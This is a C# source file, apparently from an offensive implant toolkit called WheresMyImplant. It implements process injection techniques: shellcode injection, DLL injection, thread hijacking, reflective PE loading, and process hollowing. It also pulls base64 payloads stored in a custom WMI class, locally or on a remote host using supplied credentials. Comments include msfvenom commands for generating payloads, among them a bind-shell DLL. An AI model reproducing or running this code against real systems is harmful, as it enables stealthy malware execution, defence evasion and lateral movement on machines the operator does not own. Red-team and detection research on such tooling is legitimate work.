using System;
using System.Management;

using Tokenvator;

namespace WheresMyImplant
{
    public sealed class Injection
    {
        //msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
        //Invoke-CimMethod -Class Win32_Implant -Name InjectShellCode -Argument @{shellCodeString=$payload; processId=432}
        public static void InjectShellCode(String strProcessId, String shellCodeString)
        {
            Int32 dwProcessId = 0;
            if (String.IsNullOrEmpty(strProcessId))
            {
                using (var injectShellCode = new InjectShellCode(shellCodeString))
                {
                    injectShellCode.Execute();
                }
            }
            else if (Int32.TryParse(strProcessId, out dwProcessId))
            {
                using (var injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)dwProcessId))
                {
                    using (var tokens = new Tokens())
                    {
                        injectShellCodeRemote.Execute();
                    }
                }
            }
            else
            {
                Console.WriteLine("Unknown Error");
            }
        }

        public static void InjectShellCodeWMIFSB64(String processId, String wmiClass, String fileName)
        {

            Byte[] peBytes = Misc.QueryWMIFS(wmiClass, fileName);
            String shellCodeString = System.Text.Encoding.Unicode.GetString(peBytes);

            Int32 dwProcessId = 0;
            if (String.IsNullOrEmpty(processId))
            {
                using (var injectShellCode = new InjectShellCode(shellCodeString))
                {
                    injectShellCode.Execute();
                }
            }
            else if (Int32.TryParse(processId, out dwProcessId))
            {
                using (var injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)dwProcessId))
                {
                    using (var tokens = new Tokens())
                    {
                        injectShellCodeRemote.Execute();
                    }
                }
            }
            else
            {
                Console.WriteLine("Unknown Error");
            }
        }

        public static void HijackThread(String strProcessId, Byte[] buffer)
        {
            try
            {
                if (!Int32.TryParse(strProcessId, out Int32 dwProcessId))
                {
                    Console.WriteLine("[-] Invalid Process ID: {0}", strProcessId);
                    return;
                }

                using (var ht = new HijackThread((UInt32)dwProcessId, buffer))
                {
                    ht.Execute();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.ToString());
            }
        }

        //http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread
        //msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
        public static void LoadDll(String processId, String library)
        {
            Int32 dwProcessId = 0;
            if (String.IsNullOrEmpty(processId))
            {
                LoadDll injectDll = new LoadDll(library);
            }
            else if (Int32.TryParse(processId, out dwProcessId))
            {
                using (var injectDllRemote = new LoadDllRemote(library, (UInt32)dwProcessId))
                {
                    using (var tokens = new Tokens())
                    {
                        injectDllRemote.Execute();
                    }
                }
            }
            else
            {
                Console.WriteLine("Unknown Error");
            }
        }

        public static void InjectPE(String processId, String fileName, String parameters)
        {
            using (PELoader peLoader = new PELoader())
            {
                if (!peLoader.Execute(fileName))
                {
                    Console.WriteLine("PELoader Failed");
                    return;
                }
                _InjectPE(processId, peLoader, parameters);
            }
        }

        public static void InjectPEString(String processId, String peString, String parameters)
        {
            using (PELoader peLoader = new PELoader())
            {
                if (!peLoader.Execute(Convert.FromBase64String(peString)))
                {
                    Console.WriteLine("PELoader Failed");
                    return;
                }
                _InjectPE(processId, peLoader, parameters);
            }
        }

        public static void InjectPEWMIFS(String processId, String wmiClass, String fileName, String parameters)
        {
            using (PELoader peLoader = new PELoader())
            {
                if (!peLoader.Execute(Misc.QueryWMIFS(wmiClass, fileName)))
                {
                    Console.WriteLine("PELoader Failed");
                    return;
                }
                _InjectPE(processId, peLoader, parameters);
            }
        }

        public static void InjectPEWMIFSRemote(String processId, String wmiClass, String system, String username, String password, String fileName, String parameters)
        {
            var options = new ConnectionOptions();
            options.Username = username;
            options.Password = password;

            var scope = new ManagementScope("\\\\" + system + "\\root\\cimv2", options);
            scope.Connect();

            var queryIndexCount = new ObjectQuery("SELECT Index FROM WMIFS WHERE FileName = \'" + fileName + "\'");
            var searcherIndexCount = new ManagementObjectSearcher(scope, queryIndexCount);
            ManagementObjectCollection queryIndexCollection = searcherIndexCount.Get();
            Int32 indexCount = queryIndexCollection.Count;

            String EncodedText = "";
            for (Int32 i = 0; i < indexCount; i++)
            {
                var queryFilePart = new ObjectQuery("SELECT FileStore FROM WMIFS WHERE FileName = \'" + fileName + "\' AND Index = \'" + i + "\'");
                var searcherFilePart = new ManagementObjectSearcher(scope, queryFilePart);
                ManagementObjectCollection queryCollection = searcherFilePart.Get();

                foreach (ManagementObject filePart in queryCollection)
                    EncodedText += filePart["FileStore"].ToString();
            }

            Byte[] peBytes = Convert.FromBase64String(EncodedText);
            using (PELoader peLoader = new PELoader())
            {
                if (!peLoader.Execute(peBytes))
                {
                    Console.WriteLine("PELoader Failed");
                    return;
                }
                _InjectPE(processId, peLoader, parameters);
            }
        }

        private static void _InjectPE(String processId, PELoader peLoader, String parameters)
        {
            Console.WriteLine("\n");

            try
            {
                if (!Int32.TryParse(processId, out Int32 dwProcessId))
                {
                    var injectPE = new InjectPE(peLoader, parameters);
                }
                else
                {
                    var injectPE = new InjectPERemote((UInt32)dwProcessId, peLoader, parameters);
                    try
                    {
                        using (var tokens = new Tokens())
                        {
                            injectPE.Execute();
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] {0}", ex.Message);
                    }
                }
            }
            catch (FormatException ex)
            {
                Console.WriteLine("[-] Unable to Parse Process ID");
                Console.WriteLine("[-] {0}", ex.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Unhandled Exception Occured");
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void HollowProcess(String target, String replacement, String wait)
        {
            if (!Boolean.TryParse(wait, out Boolean bWait))
            {
                Console.WriteLine("Unable to parse wait parameter (true, false)");
                return;
            }

            try
            {
                using (HollowProcess hp = new HollowProcess())
                {
                    if (!hp.ReadSourceImageFile(replacement))
                        return;

                    if (!hp.CreateSuspendedProcess(target))
                        return;

                    if (!hp.RemapImage())
                        return;

                    if (!hp.ResumeProcess(bWait))
                        return;
                }
                Console.WriteLine("\nProcess Hollowed");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Unhandled Exception Occured");
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void HollowProcessString(String target, String replacement, String wait)
        {
            if (!Boolean.TryParse(wait, out Boolean bWait))
            {
                Console.WriteLine("Unable to parse wait parameter (true, false)");
                return;
            }

            try
            {
                using (HollowProcess hp = new HollowProcess())
                {
                    if (!hp.ReadSourceImageString(replacement))
                        return;

                    if (!hp.CreateSuspendedProcess(target))
                        return;

                    if (!hp.RemapImage())
                        return;

                    if (!hp.ResumeProcess(bWait))
                        return;
                }
                Console.WriteLine("\nProcess Hollowed");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Unhandled Exception Occured");
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }
    }
}
